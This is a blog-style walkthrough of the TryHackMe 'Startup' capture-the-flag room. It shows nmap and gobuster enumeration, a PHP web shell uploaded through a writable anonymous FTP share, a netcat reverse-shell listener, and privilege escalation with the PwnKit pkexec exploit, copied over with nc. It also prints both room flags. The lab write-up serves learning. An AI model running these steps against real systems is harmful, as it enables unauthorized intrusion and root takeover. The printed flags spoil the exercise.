---
layout: post
title: "TryHackMe: Startup"
date: 2025-10-21 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, walkthrough, sql-injection, privilege-escalation, suid, hash-cracking, pentesting]
render_with_liquid: false
media_subpath: /images/Startup/
description: "Explore the TryHackMe 'Startup' room, where you'll uncover vulnerabilities, exploit them, and escalate privileges to root."
---

# TryHackMe: Startup â€” Writeup | 21 October 2025

![TryHackMe Logo](THM.png)
![Room Banner](Startup.png)

---

## Overview

This writeup provides a comprehensive guide to completing the TryHackMe "Startup" room. The room focuses on identifying vulnerabilities in a startup's infrastructure, exploiting them to gain unauthorized access, and escalating privileges to root. You can find the official room details [here](https://tryhackme.com/room/startup?ref=blog.tryhackme.com).

---

## Reconnaissance & Scanning

### Nmap

Perform a full port and service scan:

```bash
sudo nmap -Pn -T4 -n -sC -p- -oN scan_Startup.txt 10.201.38.83
```

**Scan Summary:**

```
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.76.195
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http
|_http-title: Maintenance

# Nmap done at Tue Oct 21 23:18:04 2025 -- 1 IP address (1 host up) scanned in 953.40 seconds
```

![Nmap Scan Results](nmap_scan.png)

---

## Web Enumeration

Run Gobuster to locate hidden directories:

```bash
gobuster dir -u http://10.201.38.83/ \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
    -o dir_results.txt -t 25
```

**Discovered Directory:**

```
/files                (Status: 301) [Size: 312] [--> http://10.201.38.83/files/]
```

---

## FTP Enumeration

Anonymous FTP login is allowed. Connect using:

```bash
ftp 10.201.38.83
```

![FTP Login](ftp_login.png)

From the Nmap scan, we identified two files: `notice.txt` and `important.jpg`. The FTP server is writable.

![FTP Vulnerability](ftp_vul.png)

---

## Exploitation

### Uploading Malicious Files

We can upload a web shell to the FTP server and access it via a web browser.

```bash
ftp> put shell.php
```

![Reverse Shell Upload](rev_shell.png)

![FTP Upload](ftp_upload.png)

Access the web shell via:

```
http://10.201.38.83/files/shell.php
```

![Web Shell](web_shell.png)

---

### Getting a Reverse Shell

Set up a Netcat listener on your machine:

```bash
nc -lvnp 4444
```

![Netcat Listener](netcat_listener.png)

Once connected, we gain a shell as the `www-data` user.

---

### Privilege Escalation

#### SUID Binary

Using the following command, we find a file named `startup` in `/usr/local/bin/startup`:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID File](suid_file.png)

#### Exploiting pkexec

The target machine has `pkexec` installed.

![pkexec](pkexec.png)

Using the exploit from [PwnKit](https://github.com/ly4k/PwnKit?tab=readme-ov-file), we gain root access.

Transfer the exploit to the target machine using Netcat:

On your machine:

```bash
nc -lvnp 1111 < PwnKit
```

![Transfer from Local](our_machine.png)

On the target machine:

```bash
nc 10.201.38.83 1111 > PwnKit
```

![Transfer to Target](victim_machine.png)

Grant execute permissions and run the exploit:

```bash
chmod +x PwnKit
./PwnKit
```

![Root Access](root_access.png)

---

## Flags

- **User Flag:** `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`  
    ![User Flag](user_flag.png)

- **Root Flag:** `THM{f963aaa6a430f210222158ae15c3d76d}`  
    ![Root Flag](root_flag.png)

---

## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

---

## Happy Hacking!

<div align="center">
    <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExcHZoMml1dG9pcW0yM2d3dHowa2xrM2xmdGY0ODhia2YwOHdwd3RwbSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/lptIayuGHV9Utu3iTv/giphy.gif" alt="Hacking GIF" width="800"/>
</div>

